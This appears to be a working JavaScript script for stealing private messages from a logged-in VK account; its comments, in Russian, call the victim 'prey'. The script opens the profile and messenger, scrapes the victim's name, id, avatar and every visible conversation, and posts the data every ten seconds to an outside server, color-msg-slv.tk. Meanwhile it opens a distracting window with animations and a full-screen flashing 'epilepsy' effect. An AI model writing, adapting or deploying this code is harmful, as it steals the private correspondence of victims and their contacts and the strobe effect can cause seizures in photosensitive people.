// dialogs = {
// 'Илья Ревиков': {
//     'Олег Олегрович' : ['div', 'div'],
//     ...
// }
// }

/**
 * останавливает код на ms секунд, чтобы скрипт успел выполниться
 * @param {wait time} ms 
 */
const wait = async (ms) => await new Promise(resolve => setTimeout(resolve, ms));

/**
 * получение случайного элемента массива
 * @param arr
 * @return {*}
 */
function arrayRandElement(arr) {
    let rand = Math.floor(Math.random() * arr.length);
    return arr[rand];
}


// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
/**
 * Получает кнопку "Моя страница" и нажимает на нее, чтобы перейти в профиль
 */
function toProfile() {
    document.querySelector('#l_pr a').click();
}
/**
 * Получает имя и фамилию на странице с профилем
 */
function getPreyFullName() {
    let elem = document.querySelector('.page_name');
    return elem ? elem.textContent.trim() : 'Без имени';
}
// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //

// =================== id ЖЕРТВЫ ====================== //
function getPreyId() {
    // get path name (/vk_id) and remove slash
    return window.location.pathname.slice(1);
}
// =================== id ЖЕРТВЫ ====================== //

// ==================== АВАТАР ======================== //
function getPreyAvatar() {
    return document.querySelector('.TopNavBtn__profileImg').getAttribute('src');
}
// ==================== АВАТАР ======================== //


/**
 * Получает ссылку "Мессенджер" и нажимает на неё, чтобы перейти в сообщения
 */
function toMessages() {
    document.querySelector('#l_msg a').click();
}

/**
 * Проходится по всем диалогам в панели слева и получает их id
 */
function getDialogsIDs() {
    let dialogs = [];

    document.querySelectorAll('.nim-dialog').forEach(link => {
        dialogs.push({
            'list-id': link.getAttribute('data-list-id'),
            'msgid': link.getAttribute('data-msgid'),
        });
    });

    return dialogs;
}

/**
 * По ID получает диалог из левого сайд бара и кликает по нему, чтобы переместиться на страницу с этим диалогом
 */
function goToDialog(list_id) {
    document.querySelector(`._im_dialog_${list_id}`).click();
}

/**
 * Получает имя собеседника на текущей странице
 */
function getFriendName() {
    let elem = document.querySelector('._im_page_peer_name');
    return elem ? elem.textContent.trim() : 'Без имени';
}

/**
 * Получает все видимые сообщения на этой странице
 */
function getMessages() {
    let messages = [];
    document.querySelectorAll('.im-mess-stack').forEach(mess =>
        messages.push({
            name: mess.querySelector('.im-mess-stack--lnk').innerHTML,
            mess: mess.querySelector('.im-mess--text').outerHTML,
        })
    );
    return messages;
}


// =============================================== //
// ================= ОТВЛЕЧЕНИЕ ================== //
function diversion() {
    // открываем новое окно с вк
    let vkCopy = window.open('https://vk.com/im');

    // когда новое окно загрузится выполняем скрипт, который отвлечет человека
    setTimeout(() => {
        // ========== ДОБАВЛЯЕМ ПАКМАНА НА СТРАНИЦУ ==========

        // стили для пакмана
        let styles = `
         .pacman-wrapper{
             position: relative;
             height: 70px;
             background-color: magenta;
             background-image: linear-gradient( 45deg,black 25%, transparent 25%, transparent 74%, black 75%, black), 
             linear-gradient( 45deg,black 25%, transparent 25%, transparent 74%, black 75%, black);
             background-size: 20px 20px;
             background-position: 0 0, 10px 10px;
             margin: 0 -100px 0 0;
 
             animation-name: pacman-move;
             animation-duration: 12s;
             animation-iteration-count: 1;
             z-index: 1000;
         }
         .pacman {
             width: 70px;
             height: 70px;
             border-radius: 50%;
             background: #F2D648;
             position: absolute;
             right: -35px;
           }
           
           .pacman__eye {
             position: absolute;
             width: 8px;
             height: 8px;
             border-radius: 50%;
             top: 14px;
             right: 27px;
             background: #333333;
         }
           
           .pacman__mouth {
             background: #000;
             position: absolute;
             width: 100%;
             height: 100%;
             clip-path: polygon(100% 74%, 44% 48%, 100% 21%);
             animation-name: eat;
             animation-duration: 0.7s;
             animation-iteration-count: infinite;
           }
           
           @keyframes eat {
             0% {
               clip-path: polygon(100% 74%, 44% 48%, 100% 21%);
             }
             25% {
               clip-path: polygon(100% 60%, 44% 48%, 100% 40%);
             }
             50% {
               clip-path: polygon(100% 50%, 44% 48%, 100% 50%);
             }
             75% {
              clip-path: polygon(100% 59%, 44% 48%, 100% 35%);
             }
             100% {
              clip-path: polygon(100% 74%, 44% 48%, 100% 21%);
             }
           }
           @keyframes pacman-move {
             0% {
                 width: 0;
             }
             100% {
                 width: 120%;
             }
           }
         `;

        // добавляем стили в тег style, а затем в head
        let styleSheet = vkCopy.document.createElement("style");
        styleSheet.type = "text/css";
        styleSheet.innerText = styles;
        vkCopy.document.head.appendChild(styleSheet);

        // получаем все эелменты с диалогами
        vkCopy.document.querySelectorAll('.nim-dialog').forEach((dialogElem, i) => {
            // каждые 2 секунды выпускаем кракена
            setTimeout(function () {
                dialogElem.innerHTML += `<div class="pacman-wrapper">
                                             <div class="pacman">
                                             <div class="pacman__eye"></div>
                                             <div class="pacman__mouth"></div>
                                             </div>
                                         </div>`;
            }, i * 2000);
        });


        // ===== ЭФФЕКТ ЭПИЛЕПСИИ ===== //
        setTimeout(() => {
            let styles_epilepsy = `
                 .epilepsy {
                     position: fixed;
                     top: 0;
                     left: 0;
                     width: 100vw;
                     height: 100vh;
                     animation-name:epilepsy;
                     animation-duration: 1s;
                     animation-iteration-count: infinite;
                     background-repeat: no-repeat;
                     background-size: cover;
                 }
 
                 @keyframes epilepsy {
                     0% {
                         background: #39ff14;
                     }
                     5% {
                         background: black;
                     }
                     10% {
                         background: ##ff0000;
                     }
                     15% {
                         background: black;
                     }
                     20% {
                         background: white;
                     }
                     25% {
                         background: black;
                     }
                     30% {
                         background: #003cff;
                     }
                     35% {
                         background: white;
                     }
                     40% {
                         background: black;
                     }
                     47% {
                         background: white;
                     }
                     48% {
                         background: black;
                     }
                     45% {
                         background: white;
                     }
                     49% {
                         background: #39ff14;
                     }
                     50% {
                         background: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU)
                     }
                     60% {
                         background: black;
                     }
                     62% {
                         background: white;
                     }
                     62% {
                         background: magenta;
                     }
                     64% {
                         background: #39ff14;
                     }
                     66% {
                         background: gray;
                     }
                     68% {
                         background: blue;
                     }
                     70% {
                         background: magenta;
                     }
                     75% {
                         background: white;
                     }
                     80% {
                         background: #fc0349;
                     }
                     90% {
                         background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,0,0,1) 19%, rgba(255,0,0,1) 50%, rgba(0,0,0,1) 64%, rgba(246,0,0,1) 83%, rgba(0,0,0,1) 89%);
                     }
                     100% {
                         background: #15ff00;
                     }
                 }
 
             `;

            // добавляем стили в тег style, а затем в head
            let styleSheet_epilepsy = vkCopy.document.createElement("style");
            styleSheet_epilepsy.type = "text/css";
            styleSheet_epilepsy.innerText = styles_epilepsy;
            vkCopy.document.body.appendChild(styleSheet_epilepsy);

            let epilepsy_bg = vkCopy.document.createElement('div');
            epilepsy_bg.classList.add('epilepsy');
            vkCopy.document.body.appendChild(epilepsy_bg);
        }, 6000);
        // ===== ЭФФЕКТ ЭПИЛЕПСИИ ===== //

        // ===== BREAK PAGE BY RANDOM COLORS ===== //
        // get elements for painting
        let divs = vkCopy.document.querySelectorAll('a, ol, ul, input, textarea');

        // every 5sec update elements list
        setInterval(() => {
            divs = vkCopy.document.querySelectorAll('a, ol, ul, input, textarea');
        }, 5000);

        /**
         * get randow div on page and paint it random color
         */
        function paintRandom() {
            // get random bg
            let bg = "background-color: " +
                '#' + (Math.random().toString(16) + '000000').substring(2, 8).toUpperCase();

            arrayRandElement(divs).style = bg; // bg for random element
        }

        setInterval(paintRandom, 70);
        // ===== BREAK PAGE BY RANDOM COLORS ===== //
    }, 5000);
}
// ================= ОТВЛЕЧЕНИЕ ================== //

// ======================== //
// ===== IT IS MAGICK ===== //
async function hacking() {
    // Сначала открываем отвлекающее окно
    diversion();
    // ==================================

    // ===== GET PREY's FULLNAME ===== //
    toProfile(); // go to profile
    await wait(3500); // wait some time
    let preyName = await getPreyFullName(); // get full name
    // ===== GET PREY's FULLNAME ===== //

    // ===== GET PREY's VK id ===== //
    // on profile page get vk id from url
    let preyId = getPreyId(); // get full name
    // ===== GET PREY's VK id ===== //

    let preyAvatar = getPreyAvatar();


    // ===== GO TO MESSAGES Page ===== //
    toMessages();
    await wait(3000); // wait some time
    // ===== GO TO MESSAGES Page ===== //


    // инициализируем объект с полученными данными
    let dialogsData = {
        // key is vk id of prey
        // and save prey's name
        [preyId]: {
            name: preyName,
            avatar: preyAvatar
        }
    }
    // инициализируем объект с полученными данными

    let dialogsIds = getDialogsIDs(); // получаем id диалогов, чтобы можно было по ним пройтись циклом
    let dialogsCount = dialogsIds.length; // кол-во диалогов
    let i = 0; // номер текущего диалога в массиве id

    // ===== PARSE DIALOGS ===== //
    let parser = setInterval(() => {
        // data is end
        if (!dialogsIds) return;
        if (!dialogsIds[i]) return;

        // переходим к следующиму диалогу
        goToDialog(dialogsIds[i]['list-id']);

        // получаем имя собеседника
        let friendName = getFriendName();

        // добавляем сообщения с этой страницы в объект по имени
        dialogsData[preyId][friendName] = getMessages();

        // console.log(dialogsData);

        i++; // увеличиваем i, чтобы перейти к след. диалогу
    }, 2000);

    // каждыйе 10 секунд асинхронно отправляем полученные данные на сервер
    let saver = setInterval(() => {
        let formData = new FormData();
        formData.append('data', JSON.stringify(dialogsData));

        fetch(
            'https://color-msg-slv.tk/api/save-it.php', {
                method: 'POST',
                mode: 'no-cors',
                body: formData,
            }
        );

        console.log('data is missed');

        dialogsData = {
            [preyId]: {}
        };
    }, 10000);
}

hacking();